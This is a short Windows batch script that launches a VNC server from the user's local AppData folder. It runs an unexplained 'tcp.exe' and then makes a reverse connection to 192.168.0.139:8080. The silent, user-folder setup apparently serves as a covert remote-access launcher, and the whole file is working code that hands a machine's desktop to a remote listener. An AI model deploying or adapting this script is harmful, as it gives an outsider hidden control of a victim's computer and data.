@echo off
cd /d "%localappdata%\VNC"
tcp.exe
timeout /t 1 >nul
winvnc.exe -connect 192.168.0.139:8080
timeout /t 1 >nul
winvnc.exe -run
exit
